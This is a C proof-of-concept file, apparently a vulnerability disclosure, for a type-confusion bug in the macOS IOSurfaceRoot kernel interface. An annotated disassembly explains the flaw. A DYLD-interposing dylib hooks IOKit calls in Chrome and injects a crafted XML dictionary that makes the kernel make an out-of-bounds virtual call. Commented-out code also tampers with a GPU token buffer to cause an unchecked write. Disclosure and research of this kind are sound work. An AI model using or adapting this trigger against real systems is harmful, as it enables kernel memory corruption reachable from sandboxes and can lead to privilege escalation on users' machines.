/*
build: clang -Wall -dynamiclib -o surfaceroot.dylib surfaceroot.c -framework IOKit -arch i386 -arch x86_64
run: DYLD_INSERT_LIBRARIES=./surfaceroot.dylib /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --single-process

External method 0 of IOSurfaceRoot is IOSurfaceRootUserClient::create_surface. This method expects to receive an xml string which it
deserializes into an OSDictionary. It then passes that dictionary to IOSurfaceRoot::createSurface(task *,OSDictionary *)

here's the relevant code:

__text:0000000000005E13                 mov     rax, [rbx]
__text:0000000000005E16                 lea     rcx, _kIOSurfaceClassName   ; "IOSurfaceClass"
__text:0000000000005E1D                 mov     rsi, [rcx]
__text:0000000000005E20                 mov     rdi, rbx                    ; input OSDictionary - contents controlled
__text:0000000000005E23                 call    qword ptr [rax+208h]
__text:0000000000005E29                 mov     rcx, cs:off_A030
__text:0000000000005E30                 mov     rsi, [rcx]      ; char *
__text:0000000000005E33                 mov     rdi, rax                    ; check that IOSurfaceString was an OSString
__text:0000000000005E36                 call    __ZN15OSMetaClassBase12safeMetaCastEPKS_PK11OSMetaClass ; OSMetaClassBase::safeMetaCast(OSMetaClassBase const*,OSMetaClass const*)
__text:0000000000005E3B                 test    rax, rax
__text:0000000000005E3E                 jz      short loc_5E4A              ; if either there was no "IOSurfaceClass" key or the value wasn't a string then jump
                                                                            ; to 54ea and use "IOSurface"
__text:0000000000005E40                 mov     rdi, rax                    ; otherwise, pass the usercontrolled string to OSMetaClass::allocClassWithName
__text:0000000000005E43                 call    __ZN11OSMetaClass18allocClassWithNameEPK8OSString ; OSMetaClass::allocClassWithName(OSString const*)
__text:0000000000005E48                 jmp     short loc_5E56
__text:0000000000005E4A ; ---------------------------------------------------------------------------
__text:0000000000005E4A
__text:0000000000005E4A loc_5E4A:                               ; CODE XREF: IOSurfaceRoot::createSurface(task *,OSDictionary *)+4Aj
__text:0000000000005E4A                 lea     rdi, aIosurface ; "IOSurface"
__text:0000000000005E51                 call    __ZN11OSMetaClass18allocClassWithNameEPKc ; OSMetaClass::allocClassWithName(char const*)
__text:0000000000005E56
__text:0000000000005E56 loc_5E56:                               ; CODE XREF: IOSurfaceRoot::createSurface(task *,OSDictionary *)+54j
__text:0000000000005E56                 mov     r12, rax        ; save reflection-allocated class pointer into r12
__text:0000000000005E59                 mov     rdi, [r14+0F8h]
__text:0000000000005E60                 call    _IORecursiveLockLock
__text:0000000000005E65                 test    r12, r12
__text:0000000000005E68                 jz      short loc_5EDD
__text:0000000000005E6A                 lea     rax, __ZN9IOSurface9metaClassE ; IOSurface::metaClass
__text:0000000000005E71                 mov     rsi, [rax]
__text:0000000000005E74                 mov     rdi, r12        ; does that reflection-allocated class's metaclass inherit from IOSurface::metaClass
__text:0000000000005E77                 call    __ZN15OSMetaClassBase12safeMetaCastEPKS_PK11OSMetaClass ; OSMetaClassBase::safeMetaCast(OSMetaClassBase const*,OSMetaClass const*)
__text:0000000000005E7C                 test    rax, rax
__text:0000000000005E7F                 jz      short loc_5EC0  ; if it doesn't jump to 5ec0

...

__text:0000000000005EC0
__text:0000000000005EC0 loc_5EC0:                               ; CODE XREF: IOSurfaceRoot::createSurface(task *,OSDictionary *)+8Bj
__text:0000000000005EC0                                         ; IOSurfaceRoot::createSurface(task *,OSDictionary *)+A5j
__text:0000000000005EC0                 mov     rdi, [r14+0F8h]
__text:0000000000005EC7                 call    _IORecursiveLockUnlock
__text:0000000000005ECC                 mov     rax, [r12]      ; r12 is the pointer to the reflection-allocated class
__text:0000000000005ED0                 mov     rdi, r12
__text:0000000000005ED3                 call    qword ptr [rax+120h]  ; call the virtual method at offset +0x120 in that objects vtable
                                                                      ; +0x120 is the offset of IOSurface::release - not OSObject::release - it's only valid for subclasses of
                                                                      ; IOSurface - for other types this could be anything


The code reads a user-controlled string from the input dictionary with the key "IOSurfaceClass" then passes that string to the IOKit C++ reflection API
OSMetaClass::allocClassWithName. This instantiates a completely user-controlled IOKit class, saving a pointer to the allocated object in r12.

The code then passes that pointer to safeMetaCast to determine if the newly-allocated object is in fact a subtype of IOSurface. If it isn't then the code calls the
virtual method at offset 0x120 in the controlled object - this offset is outside the vtable of the OSObject base class therefore the code probably looked something like this:

IOSurface* foo = (IOSurface*) allocClassWithName(controlledName);
if(!safeMetaCast(foo, IOSurface::metaClass)){
  foo->release(); // calls IOSurface::release which is a virtual method at +0x120 in vtable - not OSObject::release which is +0x28
}

Attached PoC demonstrates this by instantiating an IOAccelCommandBufferPool2 - this object has a vtable which is smaller that 0x120 clearly demonstrating that this is a bug!

Exploitation would hinge on being able to find an object with a suitably interesting pointer at that offset in its vtable - I would imagine there are almost certainly
good candidates but I haven't looked yet.

IOSurfaceRootUserClient is reachable in almost all sandboxes on OS X and iOS.

tested on: MacBookAir5,2 w/ 10.10.1/14B25
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

// the mach port for the IGAccelVideoContextMain user client
mach_port_t port = 0;
void* token_buf = 0;
size_t token_buf_size = 0;

kern_return_t
fake_IOConnectCallMethod(
  mach_port_t  connection,    // In
  uint32_t   selector,    // In
  /*const*/ uint64_t  *input,     // In
  uint32_t   inputCnt,    // In
  /*const*/ void  *inputStruct,   // In
  size_t     inputStructCnt,  // In
  uint64_t  *output,    // Out
  uint32_t  *outputCnt,   // In/Out
  void    *outputStruct,    // Out
  size_t    *outputStructCntP)  // In/Out
{
  kern_return_t ret = 0;  
  if (connection == port && selector == 0) {
    printf(" original : %s\n", inputStruct);
    inputStruct = "<dict><key>IOSurfaceClass</key><string>IOAccelCommandBufferPool2</string><key>IOSurfaceBytesPerElement</key><integer size=\"32\">0x4</integer><key>IOSurfaceWidth</key><integer size=\"32\">0x40</integer><key>IOSurfaceHeight</key><integer size=\"32\">0x40</integer><key>IOSurfaceIsGlobal</key><true/></dict>";
    inputStructCnt = strlen(inputStruct)+1;
  }
  ret = IOConnectCallMethod(
    connection,
    selector,
    input,
    inputCnt,
    inputStruct,
    inputStructCnt,
    output,
    outputCnt,
    outputStruct,
    outputStructCntP);

  return ret;
}


kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
//  printf("IOConnectMapMemory(connect=%x, memoryType=0x%x, intoTask=%x, atAddress=%p, ofSize=%x, options=%x)\n", connect, memoryType, intoTask, atAddress, ofSize, options);
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
/*
  if (memoryType == 0 && connect == port){
    token_buf = *atAddress;
    token_buf_size = *ofSize;
    printf("  this is the token buffer for IGAccelGLContext\n");
  }
  printf("  after: *atAddress: %p *ofSize = %x\n", *atAddress,  *ofSize);
*/
  return ret;
}

kern_return_t
fake_IOConnectUnmapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t atAddress)
{
//  printf("IOConnectUnmapMemory(connect=%x, memoryType=0x%x, intoTask=%x, atAddress=%p)\n", connect, memoryType, intoTask, atAddress);
  if (memoryType == 0 && connect == port){
    token_buf = 0;
  }
  return IOConnectUnmapMemory(connect, memoryType, intoTask, atAddress);
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
/*
  printf("callstructmethod\n");
  if (selector == 2 && connection == port){
    printf("submit_data_buffers?? : inputStructCnt == 0x%x\n", inputStructCnt);
    if (token_buf != 0){
      uint32_t offset = 4;
      uint16_t id;
      uint16_t len;
      uint32_t output_offset;

      uint16_t BindTextures = 0x8e00;
      uint32_t* tok = memmem(token_buf, token_buf_size, &BindTextures, 2);
      if (tok){
        tok[0x10/4] = 0x12345678; //this will be used to compute an index for a write, without any bounds checking
      }
    }
  }
*/
  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

CFMutableDictionaryRef
fake_IOServiceMatching(const char* name)
{
  CFMutableDictionaryRef ret = IOServiceMatching(name);
  printf("IOServiceMatching(name=%s) ret: %p\n", name, ret);
  return ret;
}

CFMutableDictionaryRef
fake_IOServiceNameMatching(
  const char *  name )
{
  CFMutableDictionaryRef ret = IOServiceNameMatching(name);
  printf("IOServiceNameMatching(name=%s) ret: %p\n", name, ret);
  return ret;
}

io_service_t
fake_IOServiceGetMatchingService(
  mach_port_t _masterPort,
  CFDictionaryRef matching )
{
  io_service_t ret = IOServiceGetMatchingService(_masterPort, matching);
  printf("IOServiceGetMatchingService(matching=%p) ret: %x\n", matching, ret);
  return ret;
}

kern_return_t
fake_IOServiceGetMatchingServices(
        mach_port_t _masterPort,
  CFDictionaryRef matching,
  io_iterator_t * existing )
{
  kern_return_t ret = IOServiceGetMatchingServices(_masterPort, matching, existing);
  printf("IOServiceGetMatchingServices(matching=%p, existing=%p) (*existing after call = %x\n", matching, existing, *existing);
  return ret;
}

kern_return_t
fake_IOServiceOpen(
  io_service_t service,
  task_port_t owningTask,
  uint32_t  type,
  io_connect_t  * connect )
{
  kern_return_t ret = IOServiceOpen(service, owningTask, type, connect);
  io_name_t className;
  IOObjectGetClass(service, className);
  printf("IOServiceOpen(service=%x, owningTask=%x, type=%x, connect=%p) (*connect after call = %x\n", service, owningTask, type, connect, *connect);
  printf("  (class: %s)\n", className);
  if (strcmp(className, "IOSurfaceRoot") == 0){
    // this is a surfacerootuserclient
    port = *connect;
  }
  /*
  if (type == 0x1){
    //IGAccelGLContext
    port = *connect;
  }
  */
  return ret;
}

io_object_t
fake_IOIteratorNext(
  io_iterator_t iterator )
{
  io_object_t ret = IOIteratorNext(iterator);
  printf("IOIteratorNext(iterator=%x) ret: %x\n", iterator, ret);
  return ret;
}

kern_return_t
fake_IOConnectGetService(
  io_connect_t  connect,
  io_service_t  * service )
{
  kern_return_t ret = IOConnectGetService(connect, service);
  printf("IOConnectGetService(connect=%x, service=%p) (*service after call = %x\n", connect, service, *service);
  return ret;
}

kern_return_t
fake_IOServiceClose(
  io_connect_t  connect )
{
  printf("IOServiceClose(connect=%p)\n", connect);
  return IOServiceClose(connect);
}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectCallMethod, .original = (void*)IOConnectCallMethod}, 
      {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectUnmapMemory, .original = (void*)IOConnectUnmapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
      {.replacement = (void*)fake_IOServiceMatching, .original = (void*)IOServiceMatching},
      {.replacement = (void*)fake_IOServiceGetMatchingService, .original = (void*)IOServiceGetMatchingService},
      {.replacement = (void*)fake_IOServiceGetMatchingServices, .original = (void*)IOServiceGetMatchingServices},
      {.replacement = (void*)fake_IOServiceOpen, .original = (void*)IOServiceOpen},
      {.replacement = (void*)fake_IOIteratorNext, .original = (void*)IOIteratorNext},
      {.replacement = (void*)fake_IOConnectGetService, .original = (void*)IOConnectGetService},
      {.replacement = (void*)fake_IOServiceNameMatching, .original = (void*)IOServiceNameMatching},
      {.replacement = (void*)fake_IOServiceClose, .original = (void*)IOServiceClose},
    };

